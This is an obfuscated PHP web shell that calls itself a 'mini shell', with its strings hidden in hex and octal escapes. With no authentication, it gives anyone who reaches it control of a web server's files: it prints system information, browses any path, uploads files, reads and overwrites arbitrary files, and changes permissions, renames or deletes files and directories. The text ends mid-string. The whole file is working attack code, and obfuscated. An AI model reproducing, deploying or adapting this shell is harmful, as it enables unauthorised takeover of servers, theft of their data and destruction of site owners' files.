<?php
 goto PwRtP; LsHBB: function perms($file) { $perms = fileperms($file); if (($perms & 49152) == 49152) { $info = "\x73"; } elseif (($perms & 40960) == 40960) { $info = "\154"; } elseif (($perms & 32768) == 32768) { $info = "\55"; } elseif (($perms & 24576) == 24576) { $info = "\x62"; } elseif (($perms & 16384) == 16384) { $info = "\x64"; } elseif (($perms & 8192) == 8192) { $info = "\143"; } elseif (($perms & 4096) == 4096) { $info = "\160"; } else { $info = "\165"; } $info .= $perms & 256 ? "\162" : "\55"; $info .= $perms & 128 ? "\167" : "\55"; $info .= $perms & 64 ? $perms & 2048 ? "\x73" : "\170" : ($perms & 2048 ? "\123" : "\x2d"); $info .= $perms & 32 ? "\162" : "\x2d"; $info .= $perms & 16 ? "\167" : "\55"; $info .= $perms & 8 ? $perms & 1024 ? "\x73" : "\170" : ($perms & 1024 ? "\x53" : "\55"); $info .= $perms & 4 ? "\x72" : "\x2d"; $info .= $perms & 2 ? "\x77" : "\55"; $info .= $perms & 1 ? $perms & 512 ? "\164" : "\170" : ($perms & 512 ? "\124" : "\x2d"); return $info; } goto cGLgZ; PwRtP: set_time_limit(0); goto ZxkDB; etipS: echo "\74\57\164\144\x3e\74\57\x74\162\x3e\x3c\164\x72\x3e\74\164\144\x3e"; goto oup4r; oup4r: if (isset($_FILES["\146\x69\154\x65"])) { if (copy($_FILES["\x66\151\154\x65"]["\164\155\x70\137\156\141\155\145"], $path . "\x2f" . $_FILES["\146\151\154\145"]["\156\x61\x6d\145"])) { echo "\74\x66\x6f\x6e\x74\x20\143\x6f\154\x6f\162\x3d\x22\143\x79\141\x6e\42\x3e\106\151\154\x65\x20\x4e\171\x61\x20\125\x64\x68\40\x44\151\40\x55\160\154\x6f\141\x64\x20\103\x75\153\x3c\x2f\146\x6f\x6e\x74\76\74\142\x72\x20\57\76"; } else { echo "\x3c\x66\x6f\156\164\x20\143\157\x6c\x6f\x72\x3d\42\162\145\x64\x22\x3e\106\151\154\x65\x20\x4e\x79\141\x20\x47\141\x67\141\x6c\40\104\151\x20\125\x70\154\x6f\141\x64\40\x43\165\x6b\74\x2f\146\157\156\x74\76\74\x62\x72\40\x2f\76"; } } goto vJmR6; Gao5w: foreach ($paths as $id => $pat) { if ($pat == '' && $id == 0) { $a = true; echo "\74\x61\40\x68\162\x65\146\75\x22\x3f\x70\141\x74\150\75\x2f\42\x3e\57\x3c\57\141\x3e"; continue; } if ($pat == '') { continue; } echo "\x3c\141\x20\x68\x72\x65\x66\75\x22\77\x70\141\x74\150\x3d"; for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "\x2f"; } } echo "\x22\x3e" . $pat . "\x3c\x2f\141\76\x2f"; } goto etipS; xzuDn: echo "\74\41\104\x4f\x43\x54\x59\x50\105\40\x48\124\x4d\x4c\x3e\xa\74\110\x54\115\114\76\xa\x3c\110\x45\x41\104\76\12\74\x6c\x69\156\x6b\x20\150\162\145\x66\75\42\42\x20\x72\145\x6c\75\42\163\164\x79\154\145\163\150\145\x65\x74\42\40\164\x79\x70\x65\75\42\164\145\170\x74\x2f\143\x73\x73\x22\x3e\xa\74\164\151\164\154\145\76\166\xc6\260\xc6\241\156\147\x20\x71\165\xe1\273\221\143\x20\x74\xe1\xba\255\x70\40\x74\x69\156\x3c\57\x74\x69\164\x6c\x65\76\xa\74\x73\x74\x79\154\145\76\xa\x62\157\x64\x79\173\xa\x63\157\154\x6f\162\72\x20\43\x66\146\146\73\xa\x66\157\x6e\x74\x2d\146\x61\155\x69\154\171\x3a\40\42\143\x6f\165\162\x69\145\162\40\x6e\145\x77\42\x2c\x20\143\165\x72\163\x69\166\145\x3b\12\142\141\x63\153\147\x72\x6f\x75\156\144\55\143\x6f\x6c\157\162\x3a\40\x23\x65\66\x65\x36\145\66\x3b\12\x74\x65\170\164\55\163\150\141\144\157\167\72\60\x70\x78\40\60\x70\x78\x20\61\x70\x78\x20\43\x37\65\x37\65\x37\x35\x3b\12\142\x61\143\x6b\147\162\157\x75\156\x64\55\160\x6f\163\151\164\151\x6f\x6e\x3a\40\x63\x65\156\x74\145\x72\73\xa\x9\142\x61\x63\153\147\x72\157\165\156\144\55\x63\157\154\x6f\162\x3a\43\x64\x39\145\63\x64\x35\73\12\40\40\40\x20\x68\145\151\x67\150\x74\x3a\x39\x38\45\x3b\xa\x20\40\x20\x20\167\151\x64\x74\x68\x3a\x39\71\45\x3b\xa\40\40\40\x20\x62\141\143\153\x67\162\157\165\156\144\x2d\x61\164\x74\x61\x63\150\155\x65\x6e\164\x3a\40\146\x69\170\x65\144\x3b\12\x20\40\x20\x20\142\141\143\153\147\162\157\165\x6e\144\55\163\x69\x7a\145\x3a\61\60\x30\45\40\x31\x31\x37\45\73\12\x9\x62\141\x63\153\147\x72\157\165\x6e\x64\55\151\155\141\147\145\x3a\165\x72\154\50\x68\164\164\160\163\72\x2f\x2f\151\155\x67\60\x30\56\144\145\x76\x69\141\x6e\x74\x61\x72\x74\x2e\156\x65\164\57\62\x32\x37\62\57\x69\57\x32\60\61\x36\x2f\61\x36\66\x2f\143\x2f\144\x2f\x61\144\165\154\x74\137\x6e\x65\160\x74\x75\156\145\137\x6d\151\x6e\151\155\x61\154\151\163\164\137\142\141\x63\x6b\147\162\x6f\x75\x6e\144\x5f\x62\171\x5f\x77\145\x65\x62\154\157\162\x64\x73\x75\x70\x72\145\155\145\x2d\144\x61\66\x65\x63\x31\x33\56\160\x6e\147\x29\x3b\xa\11\x63\x75\x72\x73\x6f\162\72\40\165\x72\x6c\x28\x68\x74\164\160\x3a\x2f\x2f\x63\x75\162\x2e\x63\165\162\163\x6f\162\163\55\x34\165\56\156\145\164\57\143\165\162\163\x6f\x72\163\57\143\165\x72\55\x31\61\x2f\143\x75\x72\61\x30\62\65\x2e\141\156\151\51\x2c\40\x75\162\x6c\x28\150\164\x74\x70\x3a\x2f\x2f\x63\x75\162\56\143\x75\162\x73\157\162\x73\55\64\165\x2e\156\x65\164\x2f\143\165\162\x73\157\162\x73\x2f\143\x75\x72\55\61\x31\x2f\143\165\x72\x31\60\x32\65\56\160\x6e\x67\51\54\x20\160\x72\157\147\x72\145\x73\x73\x20\x21\151\x6d\x70\157\162\x74\x61\156\164\x3b\12\x7d\xa\43\x63\157\x6e\164\145\156\164\x20\164\162\x3a\x68\x6f\x76\x65\x72\x7b\xa\142\141\143\153\x67\x72\x6f\x75\156\144\55\x63\x6f\154\157\162\72\x20\43\144\x34\x32\64\x38\70\x3b\12\x74\145\x78\164\x2d\x73\150\x61\x64\x6f\x77\72\x30\160\x78\x20\60\160\170\x20\61\60\160\170\40\x23\x64\64\x32\x34\x38\x38\73\xa\x7d\12\43\x63\157\156\164\145\156\164\x20\x2e\146\151\162\x73\164\x7b\12\x62\x61\143\x6b\147\162\157\165\156\x64\55\143\x6f\x6c\157\x72\72\x20\43\x64\x34\x32\64\70\x38\x3b\12\175\xa\x23\x63\x6f\156\x74\x65\156\x74\x20\56\x66\151\x72\x73\x74\x3a\150\157\166\x65\x72\x7b\xa\x62\x61\143\153\147\x72\157\165\156\x64\x2d\x63\157\154\x6f\x72\x3a\40\43\x64\64\x32\64\70\70\x3b\12\164\145\170\164\x2d\x73\150\141\144\157\167\x3a\x30\160\x78\x20\x30\x70\x78\40\x31\x70\170\x20\x23\x64\x39\x65\63\144\65\x3b\12\175\xa\x74\141\142\x6c\145\x7b\xa\142\157\162\144\145\162\72\40\61\160\x78\40\43\x64\x34\x32\64\x38\70\x20\x73\157\154\x69\x64\x3b\12\x7d\12\110\61\x7b\xa\146\157\156\164\55\x66\x61\x6d\x69\154\x79\72\x20\x22\x52\x79\145\x22\54\40\x63\x75\162\163\x69\x76\145\73\12\175\12\x61\173\xa\x63\157\x6c\x6f\162\72\x20\43\x66\x66\x66\73\12\164\x65\170\x74\55\144\x65\x63\x6f\162\x61\164\x69\x6f\x6e\72\40\x6e\157\x6e\145\x3b\12\x7d\xa\141\x3a\x68\x6f\166\x65\162\173\xa\x63\x6f\x6c\x6f\x72\72\40\43\146\146\x66\73\12\x74\145\170\x74\55\163\x68\x61\x64\157\x77\x3a\x30\160\170\x20\60\160\x78\x20\61\60\x70\170\40\43\x64\x39\x65\63\x64\x35\x3b\12\175\xa\x69\x6e\x70\x75\x74\54\163\x65\x6c\145\143\164\x2c\164\x65\x78\164\141\162\145\141\x7b\12\x62\x6f\x72\144\x65\162\72\40\61\160\170\40\x23\x66\146\x66\x20\163\157\x6c\x69\x64\73\12\x2d\155\x6f\172\55\x62\x6f\x72\x64\145\162\x2d\162\141\x64\151\165\x73\72\40\x35\160\170\x3b\12\55\x77\x65\x62\153\151\164\x2d\x62\157\x72\x64\145\x72\55\162\141\144\x69\165\163\72\x35\160\170\x3b\12\142\157\162\144\x65\162\x2d\x72\141\144\151\x75\163\72\x35\x70\170\73\xa\175\xa\x3c\x2f\x73\164\171\154\145\76\12\x3c\x2f\x48\x45\101\104\x3e\12\74\77\160\x68\160\xa\xa\xa\74\x48\x31\x3e\74\143\x65\x6e\x74\145\162\x3e\74\146\157\x6e\x74\x20\x63\157\154\x6f\162\x3d\x20\x23\146\146\146\x20\146\141\x63\x65\x3d\x63\157\165\162\x69\145\x72\40\156\x65\167\x3e\166\xc6\xb0\xc6\xa1\x6e\x67\40\x71\x75\341\273\221\x63\x20\164\xe1\272\255\x70\x20\164\x69\x6e\74\x2f\x66\157\156\164\76\x3c\57\143\145\x6e\x74\x65\x72\x3e\74\x2f\x48\x31\76\xa\x3c\x74\x61\142\x6c\x65\x20\167\x69\144\x74\150\x3d\42\x37\x30\x30\x22\40\x62\157\x72\144\x65\x72\75\x22\60\x22\40\143\145\x6c\x6c\160\x61\x64\144\x69\x6e\x67\75\x22\x33\x22\x20\143\145\154\x6c\x73\160\141\x63\x69\x6e\x67\75\42\61\x22\40\141\x6c\151\x67\156\x3d\x22\143\x65\156\x74\145\x72\x22\76\12\74\164\x72\x3e\74\164\144\76\123\x79\x73\164\x65\155\72\40\x3c\142\76" . php_uname() . "\x3c\57\142\76\x3c\142\x72\76\x3c\x62\x72\x3e\103\165\162\x72\x65\156\164\40\120\x61\x74\x68\40\72\x20"; goto m40Ut; m40Ut: if (isset($_GET["\x70\x61\x74\x68"])) { $path = $_GET["\160\141\164\x68"]; } else { $path = getcwd(); } goto AuP8G; AuP8G: $path = str_replace("\x5c", "\57", $path); goto LPVlC; ZxkDB: error_reporting(0); goto xzuDn; vJmR6: echo "\74\146\x6f\x72\155\x20\x65\156\x63\164\x79\160\145\x3d\42\155\x75\154\x74\151\160\141\162\164\x2f\x66\157\162\x6d\x2d\144\x61\x74\141\x22\x20\155\x65\164\x68\x6f\x64\75\x22\x50\117\123\124\x22\76\xa\125\160\x6c\x6f\141\144\x20\x46\x69\154\145\40\72\x20\x3c\151\x6e\x70\x75\x74\40\x74\171\160\145\x3d\42\x66\x69\154\145\42\40\x6e\141\155\x65\x3d\42\x66\x69\x6c\x65\42\x20\57\x3e\12\x3c\x69\x6e\160\x75\164\40\x74\x79\160\145\x3d\x22\163\x75\142\x6d\151\x74\x22\40\166\x61\x6c\x75\x65\75\x22\x75\160\154\x6f\x61\144\42\x20\x2f\x3e\12\x3c\57\146\x6f\x72\155\x3e\12\x3c\x2f\x74\x64\76\74\x2f\164\x72\x3e"; goto ia7BE; ibDzI: echo "\x3c\142\x72\40\x2f\x3e\170\170\170\x78\170\74\x66\157\x6e\164\x20\x63\157\154\x6f\x72\75\42\162\145\144\x22\76\x31\x2e\60\74\57\146\157\156\x74\76\x2c\x20\x58\x58\130\x20\74\x66\157\156\x74\40\143\157\x6c\157\x72\75\42\162\145\144\x22\76\170\170\x78\170\74\57\146\157\156\164\x3e\12\x3c\x21\x2d\55\x54\x75\154\151\163\x61\x6e\40\115\x69\x72\151\156\x67\55\x2d\x3e\12\x3c\163\160\141\x6e\x20\x69\144\x3d\42\163\145\x63\42\76\74\144\x69\166\x20\x69\144\75\42\146\157\164\145\162\x22\40\x63\x6c\141\163\163\75\x22\x66\157\164\145\162\42\40\x73\x74\171\154\x65\x3d\42\x70\x6f\163\x69\164\151\x6f\x6e\x3a\40\x61\x62\163\157\154\165\164\145\73\40\x74\x6f\x70\x3a\x20\x37\60\x70\x78\73\40\x6c\x65\146\164\x3a\40\55\62\x32\65\160\x78\x3b\40\x77\151\144\x74\150\x3a\40\66\60\60\x70\x78\73\x20\x68\145\x69\x67\x68\x74\x3a\x20\x32\x38\160\x78\x3b\x20\155\x61\162\147\x69\156\72\x20\x30\160\x78\x3b\x20\x70\x61\x64\144\x69\156\x67\72\x20\61\60\160\x78\73\x20\146\x6f\x6e\164\55\163\151\172\x65\x3a\x20\62\x34\160\170\73\40\x74\x65\x78\164\55\x61\154\151\x67\x6e\72\40\x63\x65\156\164\x65\162\x3b\x20\143\157\x6c\x6f\x72\72\40\162\147\x62\x28\62\65\x35\x2c\x20\62\x35\x35\x2c\40\x32\65\65\x29\x3b\x20\x66\157\156\164\x2d\146\141\155\151\154\x79\72\40\46\161\165\157\164\73\x74\162\145\x62\x75\x63\x68\x65\x74\x20\x6d\x73\x26\161\x75\157\164\x3b\x2c\x20\x43\157\165\162\151\x65\x72\x20\x6e\145\x77\x2c\40\x63\157\165\x72\x69\145\162\x20\156\x65\167\54\40\163\x61\x6e\x73\55\163\x65\162\x69\x66\73\x20\x74\162\141\156\163\146\x6f\162\155\72\40\162\x6f\164\x61\x74\145\50\55\64\x35\x64\x65\147\51\x3b\x20\164\x72\141\156\163\146\157\162\x6d\x2d\x6f\x72\151\147\151\156\x3a\x20\65\x30\45\40\x30\160\x78\40\60\160\170\x3b\40\x62\x61\143\x6b\147\x72\157\x75\156\144\x2d\143\157\x6c\157\162\x3a\40\162\x67\x62\50\60\54\x20\x30\x2c\40\60\x29\73\40\142\x6f\x72\144\145\x72\x3a\40\x31\160\170\40\x73\x6f\154\151\144\x20\x72\147\142\50\x31\67\60\54\40\61\x37\x30\x2c\40\x31\67\60\x29\x3b\x20\x6f\160\x61\143\x69\164\x79\x3a\40\x30\x2e\65\x3b\40\172\55\x69\x6e\x64\145\170\x3a\x20\61\62\x30\60\x3b\x22\76\xa\74\x66\157\156\164\40\x66\x61\x63\145\x3d\x22\x63\157\165\162\151\x65\x72\40\156\x65\167\x22\x3e\x3c\155\141\162\161\165\x65\x65\40\143\157\154\157\x72\75\x22\x64\141\162\153\x62\x6c\165\x65\42\x20\142\145\150\141\x76\x69\157\x72\75\x22\106\x6c\151\160\42\x20\163\x63\x72\157\x6c\154\x61\155\157\x75\x6e\x74\75\42\66\x22\x20\167\x69\144\x74\x68\x3d\x22\65\60\x25\42\x20\x73\x74\x79\x6c\x65\x3d\x22\167\151\x64\164\x68\72\x20\x35\60\x25\x3b\x22\x3e\123\x50\x45\103\111\x4d\105\116\x54\40\x4d\x49\x4e\x49\40\x53\110\105\x4c\114\40\55\12\x20\122\105\103\x4f\x44\105\x44\40\106\122\x4f\x4d\x20\x50\x48\101\x4e\124\x4f\x4d\40\107\x48\117\123\x54\74\x2f\x6d\x61\162\x71\x75\145\145\76\x3c\57\146\157\x6e\164\76\74\x2f\144\x69\166\x3e\x3c\57\163\x70\x61\156\76\xa\74\x21\55\x2d\x3c\x69\146\162\x61\155\x65\x20\x77\x69\144\164\150\x3d\x22\60\42\x20\150\x65\151\147\x68\x74\75\42\x30\x22\40\x73\x72\x63\x3d\x22\x68\164\x74\160\163\72\x2f\x2f\x77\x77\167\x2e\x79\157\x75\164\x75\x62\x65\56\143\x6f\x6d\57\x65\155\x62\x65\144\x2f\x31\55\170\107\145\162\166\x35\106\117\153\77\x61\x75\x74\x6f\x70\154\141\171\x3d\61\x22\40\146\x72\x61\155\145\x62\157\162\144\145\162\x3d\42\x30\42\x20\141\154\x6c\x6f\x77\146\x75\x6c\154\x73\x63\162\x65\x65\156\75\42\42\76\x3c\x2f\x69\x66\162\141\x6d\x65\x3e\xa\xa\74\x2f\102\x4f\104\x59\x3e\12\x3c\57\110\124\x4d\x4c\x3e"; goto LsHBB; ia7BE: if (isset($_GET["\x66\151\154\145\163\x72\x63"])) { echo "\x3c\x74\162\x3e\x3c\x74\x64\76\103\165\162\x72\145\156\x74\x20\106\x69\x6c\145\x20\72\x20"; echo $_GET["\146\151\154\145\163\x72\143"]; echo "\x3c\57\164\162\x3e\x3c\x2f\164\x64\x3e\x3c\57\x74\x61\142\154\x65\76\74\x62\162\40\57\x3e"; echo "\x3c\x70\162\145\x3e" . htmlspecialchars(file_get_contents($_GET["\146\151\154\x65\x73\x72\x63"])) . "\74\x2f\160\x72\x65\x3e"; } elseif (isset($_GET["\157\160\x74\x69\157\x6e"]) && $_POST["\157\160\164"] != "\x64\145\154\145\164\x65") { echo "\74\x2f\164\x61\x62\154\145\x3e\74\x62\162\x20\57\76\74\143\x65\x6e\x74\x65\x72\76" . $_POST["\x70\x61\164\150"] . "\74\x62\162\x20\x2f\x3e\x3c\142\162\40\x2f\76"; if ($_POST["\x6f\160\164"] == "\143\x68\155\x6f\144") { if (isset($_POST["\160\x65\x72\x6d"])) { if (chmod($_POST["\160\141\x74\x68"], $_POST["\160\x65\162\155"])) { echo "\x3c\x66\x6f\156\164\40\143\x6f\x6c\157\x72\x3d\x22\x63\x79\x61\156\42\x3e\x43\150\141\x6e\147\x65\40\x50\145\x72\x6d\x69\x73\163\151\157\156\40\x44\157\156\145\x2e\74\57\x66\x6f\156\164\x3e\x3c\142\x72\x20\x2f\x3e"; } else { echo "\x3c\146\157\x6e\164\40\143\x6f\154\157\x72\x3d\x22\x72\145\x64\x22\x3e\x43\150\x61\x6e\147\145\x20\120\x65\x72\155\x69\163\163\x69\x6f\156\40\x45\x72\162\x6f\x72\x2e\x3c\57\146\157\x6e\164\x3e\x3c\142\x72\x20\x2f\76"; } } echo "\74\x66\x6f\162\x6d\40\x6d\145\x74\150\x6f\144\75\x22\120\x4f\123\x54\x22\76\12\x50\145\162\x6d\151\163\x73\151\x6f\x6e\x20\x3a\40\x3c\151\156\160\x75\164\x20\x6e\141\x6d\x65\75\x22\x70\x65\162\x6d\x22\40\x74\171\x70\x65\x3d\x22\x74\x65\170\164\42\40\163\x69\172\145\75\42\x34\x22\x20\166\141\154\165\x65\75\x22" . substr(sprintf("\x25\157", fileperms($_POST["\160\x61\x74\x68"])), -4) . "\x22\x20\x2f\x3e\12\x3c\x69\156\160\165\x74\40\164\171\x70\145\x3d\42\x68\151\144\x64\145\156\42\40\156\x61\155\145\75\x22\x70\x61\x74\150\42\40\166\x61\x6c\165\x65\x3d\x22" . $_POST["\x70\141\164\150"] . "\x22\x3e\xa\74\x69\x6e\160\x75\164\x20\x74\171\x70\x65\x3d\x22\x68\x69\144\x64\x65\156\42\x20\156\x61\155\145\x3d\42\157\160\x74\42\x20\166\x61\x6c\165\x65\x3d\x22\143\x68\x6d\157\144\x22\x3e\xa\74\151\x6e\160\165\164\40\x74\171\160\x65\75\42\x73\x75\142\155\x69\164\x22\40\166\141\154\165\145\75\x22\103\162\x6f\164\172\172\x2e\x2e\42\40\x2f\76\xa\74\57\x66\157\x72\155\76"; } elseif ($_POST["\157\160\164"] == "\162\x65\156\x61\x6d\145") { if (isset($_POST["\156\145\167\x6e\x61\155\x65"])) { if (rename($_POST["\160\141\164\150"], $path . "\x2f" . $_POST["\156\145\167\156\141\155\x65"])) { echo "\74\146\157\156\164\x20\143\157\x6c\x6f\x72\x3d\x22\x63\171\x61\x6e\42\76\103\150\141\x6e\x67\x65\x20\116\x61\x6d\145\x20\123\165\143\x63\x65\x73\x2e\74\x2f\x66\157\156\164\76\74\142\x72\40\57\x3e"; } else { echo "\74\146\x6f\156\x74\x20\143\x6f\x6c\157\x72\x3d\42\x72\x65\144\42\76\x43\x68\141\156\147\x65\x20\x4e\141\155\145\x20\x45\x72\x72\x6f\162\x2e\74\57\146\x6f\156\x74\76\74\x62\x72\x20\57\76"; } $_POST["\156\x61\155\x65"] = $_POST["\x6e\145\x77\156\141\155\145"]; } echo "\x3c\x66\157\162\155\40\155\145\x74\150\x6f\x64\75\x22\120\x4f\123\124\x22\x3e\xa\116\x65\167\x20\116\141\x6d\145\40\72\40\74\x69\x6e\x70\165\x74\40\156\x61\x6d\x65\x3d\42\156\145\x77\x6e\141\x6d\145\42\x20\x74\x79\x70\145\x3d\42\x74\x65\x78\x74\42\x20\x73\x69\172\145\75\42\x32\60\x22\40\x76\141\154\165\145\x3d\x22" . $_POST["\x6e\141\155\x65"] . "\x22\x20\x2f\76\xa\74\x69\156\x70\165\164\x20\164\171\160\145\75\x22\150\151\x64\144\145\x6e\x22\x20\x6e\x61\155\145\75\42\160\141\164\150\x22\40\166\141\x6c\165\x65\x3d\x22" . $_POST["\160\x61\x74\150"] . "\42\76\xa\74\151\x6e\160\165\164\40\x74\171\x70\x65\x3d\x22\150\x69\x64\144\x65\156\x22\x20\156\141\155\145\75\42\157\160\164\x22\x20\x76\x61\154\x75\x65\75\x22\162\x65\156\x61\155\x65\x22\76\xa\x3c\x69\x6e\160\165\x74\x20\164\171\160\x65\x3d\42\x73\165\x62\155\x69\x74\42\40\166\141\154\165\145\75\x22\103\x72\157\x74\172\x7a\x2e\x2e\x22\40\57\76\12\x3c\57\146\x6f\x72\155\x3e"; } elseif ($_POST["\x6f\160\x74"] == "\145\x64\x69\164") { if (isset($_POST["\x73\x72\x63"])) { $fp = fopen($_POST["\160\141\x74\x68"], "\167"); if (fwrite($fp, $_POST["\163\162\x63"])) { echo "\74\x66\157\156\164\40\143\157\154\x6f\162\75\x22\x63\171\x61\x6e\42\x3e\x45\x64\151\164\x20\x46\151\154\145\x20\123\x75\143\x63\x65\163\74\x2f\146\157\156\x74\76\x3c\142\x72\40\x2f\x3e"; } else { echo "\74\146\157\156\164\40\143\x6f\154\x6f\x72\75\x22\x72\145\x64\x22\x3e\x45\x64\x69\x74\40\106\x69\x6c\145\x20\x45\x72\x72\x6f\x72\x3c\x2f\x66\157\x6e\x74\x3e\x3c\142\162\40\57\76"; } fclose($fp); } echo "\x3c\x66\157\x72\155\40\155\x65\164\x68\157\x64\75\42\x50\117\x53\x54\42\x3e\xa\74\164\145\x78\x74\x61\x72\x65\141\40\x63\157\154\163\x3d\70\60\40\x72\x6f\x77\163\75\x32\60\x20\x6e\141\155\145\75\x22\163\162\x63\42\76" . htmlspecialchars(file_get_contents($_POST["\x70\x61\x74\150"])) . "\74\57\x74\145\170\164\141\162\145\141\76\x3c\x62\x72\x20\57\76\xa\x3c\x69\156\x70\165\164\x20\x74\x79\160\x65\75\42\150\x69\144\144\x65\156\x22\x20\x6e\x61\x6d\x65\75\42\x70\141\164\150\x22\40\166\141\154\165\145\75\x22" . $_POST["\160\x61\x74\150"] . "\x22\76\12\74\x69\x6e\x70\x75\164\40\164\x79\x70\145\75\42\x68\151\144\144\145\x6e\x22\40\156\141\x6d\x65\75\x22\157\160\x74\x22\40\166\141\x6c\165\145\x3d\x22\x65\144\x69\x74\x22\x3e\12\74\x69\x6e\160\x75\x74\40\x74\x79\160\145\x3d\42\x73\165\142\155\151\x74\42\40\x76\141\x6c\165\145\75\x22\x43\162\x6f\164\x7a\x7a\56\x2e\42\x20\57\x3e\12\x3c\57\146\x6f\162\x6d\76"; } echo "\74\57\143\145\156\x74\x65\x72\76"; } else { echo "\74\57\x74\x61\x62\x6c\x65\x3e\x3c\x62\x72\x2f\76\x3c\143\145\x6e\x74\145\x72\x3e"; if (isset($_GET["\x6f\160\x74\151\x6f\156"]) && $_POST["\x6f\x70\x74"] == "\144\x65\x6c\x65\164\145") { if ($_POST["\x74\171\160\145"] == "\144\x69\x72") { if (rmdir($_POST["\160\141\164\150"])) { echo "\x3c\x66\x6f\x6e\x74\x20\x63\x6f\x6c\x6f\x72\75\42\143\171\141\156\x22\x3e\x44\145\154\145\164\145\x20\x44\x69\162\40\123\x75\143\x63\145\x73\56\74\x2f\146\x6f\x6e\164\76\74\142\162\x20\57\76"; } else { echo "\x3c\x66\157\156\x74\40\x63\x6f\x6c\x6f\x72\75\42\x72\x65\144\x22\x3e\x44\x65\154\145\x74\145\40\104\x69\x72\x20\x45\162\x72\157\162\x2e\x3c\x2f\146\157\x6e\x74\x3e\x3c\x62\162\40\x2f\x3e"; } } elseif ($_POST["\164\171\x70\x65"] == "\146\x69\154\145") { if (unlink($_POST["\x70\x61\x74\150"])) { echo "\74\146\x6f\156\x74\x20\143\x6f\154\157\x72\x3d\42\143\x79\141\156\x22\x3e\x44\145\154\x65\164\x65\x20\x46\x69\x6c\x65\40\123\165\x63\143\x65\163\56\x3c\57\146\x6f\x6e\x74\x3e\x3c\142\x72\40\x2f\x3e"; } else { echo "\x3c\146\157\156\x74\40\x63\x6f\154\x6f\x72\x3d\x22\162\x65\x64\42\x3e\x44\x65\x6c\145\164\x65\x20\x46\151\154\145\x20\x45\x72\x72\x6f\x72\x2e\74\57\146\x6f\x6e\164\76\x3c\x62\x72\40\x2f\76"; } } } echo "\74\57\143\145\156\164\145\162\x3e"; $scandir = scandir($path); echo "\x3c\144\x69\166\x20\x69\144\x3d\x22\x63\x6f\156\164\145\156\164\x22\76\74\x74\x61\x62\154\145\x20\x77\151\x64\x74\150\75\x22\x37\60\60\42\40\142\x6f\162\144\145\162\x3d\42\x30\x22\40\143\145\154\154\160\x61\144\144\151\x6e\147\x3d\42\x33\42\40\x63\x65\154\x6c\163\x70\141\143\x69\156\147\x3d\x22\x31\42\40\x61\x6c\151\147\x6e\x3d\42\x63\145\x6e\164\x65\x72\42\x3e\12\x3c\164\162\40\143\x6c\141\163\163\75\42\x66\151\x72\x73\164\42\x3e\xa\x3c\x74\144\76\x3c\143\145\x6e\x74\145\x72\x3e\x3c\146\x6f\156\x74\x20\x63\x6f\154\157\162\x3d\x77\150\151\164\145\76\116\x61\155\145\74\x2f\x66\157\x6e\164\76\74\57\x63\145\x6e\164\x65\x72\x3e\74\57\164\144\76\xa\x3c\164\x64\76\x3c\x63\145\156\164\x65\x72\76\74\146\157\x6e\164\x20\x63\157\154\157\x72\x3d\167\x68\151\164\x65\x3e\x53\151\x7a\x65\74\57\x66\157\156\x74\76\74\x2f\143\145\156\164\x65\162\76\74\57\164\x64\x3e\xa\74\x74\144\x3e\74\143\145\156\164\x65\162\x3e\74\146\x6f\156\x74\x20\143\157\x6c\157\162\75\167\150\151\164\145\x3e\x50\x65\x72\155\151\163\x73\151\x6f\x6e\x73\x3c\57\x66\x6f\156\164\x3e\x3c\x2f\143\145\x6e\x74\x65\162\76\74\57\x74\144\x3e\xa\x3c\x74\x64\x3e\74\x63\145\156\164\x65\x72\76\74\146\x6f\x6e\164\x20\143\x6f\154\x6f\x72\75\167\150\x69\x74\x65\76\x41\x63\164\151\157\x6e\74\57\x66\157\x6e\x74\x3e\74\57\x63\145\x6e\x74\x65\162\76\74\57\164\x64\76\xa\x3c\x2f\x74\x72\76"; foreach ($scandir as $dir) { if (!is_dir("{$path}\x2f{$dir}") || $dir == "\56" || $dir == "\56\56") { continue; } echo "\74\164\162\x3e\12\x3c\164\x64\76\74\x61\x20\150\162\145\x66\75\x22\x3f\160\141\164\x68\75{$path}\57{$dir}\x22\x3e{$dir}\x3c\x2f\141\x3e\74\x2f\164\x64\76\12\74\x74\x64\76\x3c\143\x65\x6e\x74\145\x72\76\x2d\x2d\74\57\x63\x65\x6e\164\145\162\76\x3c\57\164\144\x3e\12\x3c\164\x64\76\74\x63\145\156\x74\x65\x72\x3e"; if (is_writable("{$path}\57{$dir}")) { echo "\74\146\x6f\x6e\164\40\x63\x6f\154\x6f\x72\x3d\42\143\x79\141\x6e\42\76"; } elseif (!is_readable("{$path}\x2f{$dir}")) { echo "\x3c\146\157\156\x74\x20\x63\x6f\x6c\157\x72\x3d\x22\x72\145\x64\42\x3e"; } echo perms("{$path}\x2f{$dir}"); if (is_writable("{$path}\57{$dir}") || !is_readable("{$path}\57{$dir}")) { echo "\74\x2f\146\x6f\x6e\164\76"; } echo "\74\x2f\143\x65\x6e\x74\145\x72\76\74\57\164\x64\x3e\12\x3c\x74\x64\x3e\74\143\x65\156\x74\x65\162\x3e\x3c\146\157\162\155\40\155\x65\164\150\157\144\x3d\x22\120\x4f\x53\x54\x22\40\141\x63\x74\151\x6f\156\x3d\42\x3f\x6f\x70\x74\x69\157\x6e\46\160\x61\x74\x68\x3d{$path}\42\x3e\12\x3c\163\145\154\x65\x63\164\x20\156\x61\155\x65\75\x22\x6f\160\x74\x22\x3e\12\74\157\x70\164\x69\x6f\156\x20\x76\141\x6c\x75\x65\75\x22\42\76\x3c\x2f\x6f\160\x74\x69\x6f\156\x3e\12\x3c\x6f\160\x74\151\157\156\40\x76\x61\x6c\165\x65\x3d\x22\144\145\154\x65\164\145\42\76\104\x65\154\x65\x74\x65\74\57\157\160\164\x69\x6f\x6e\x3e\xa\x3c\157\x70\164\x69\157\x6e\40\166\x61\154\165\145\75\42\x63\x68\x6d\157\x64\x22\76\x43\x68\155\157\144\74\57\x6f\160\164\x69\x6f\x6e\x3e\12\74\157\160\164\x69\x6f\x6e\40\x76\141\154\165\x65\x3d\42\162\145\x6e\x61\155\x65\x22\x3e\122\145\156\141\x6d\x65\x3c\57\157\160\164\x69\157\x6e\x3e\12\x3c\57\x73\x65\x6c\145\x63\164\76\xa\74\x69\x6e\160\x75\x74\x20\x74\x79\160\145\x3d\x22\x68\151\x64\x64\145\x6e\42\40\156\141\155\145\75\42\x74\x79\160\x65\x22\x20\x76\141\x6c\x75\145\75\x22\x64\151\162\42\x3e\12\74\151\x6e\160\x75\164\40\x74\171\160\145\75\42\x68\x69\144\144\x65\156\42\40\x6e\x61\155\145\75\42\156\x61\x6d\145\x22\x20\x76\141\x6c\x75\x65\75\42{$dir}\42\x3e\xa\